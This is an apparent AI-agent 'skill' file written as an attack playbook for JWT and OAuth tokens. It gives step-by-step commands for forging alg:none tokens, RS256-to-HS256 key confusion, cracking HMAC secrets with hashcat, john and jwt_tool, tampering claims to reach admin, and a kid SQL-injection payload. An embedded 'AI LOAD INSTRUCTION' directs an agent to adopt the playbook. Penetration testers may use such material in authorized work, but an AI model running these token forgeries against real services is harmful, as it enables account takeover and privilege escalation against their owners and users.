---
name: jwt-oauth-token-attacks
description: "JWT/OAuth token attacks: signing algorithms, key handling, claim abuse, bearer flows, OAuth account-linking weaknesses. Signals: JWT, OAuth, token attack, signature forgery, claim tampering, account linking."
zh-signals: "JWT/OAuth 令牌攻击:签名算法、密钥处理、声明滥用、bearer 流、OAuth 账户绑定弱点。信号:jwt,oauth,令牌攻击,签名伪造,声明篡改,账户绑定。"
when-to-use: >-
  JWT and OAuth token attack playbook. Use when validating token trust, signing algorithms, key handling, claim abuse, bearer flows, and OAuth account-binding weaknesses.
---

# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
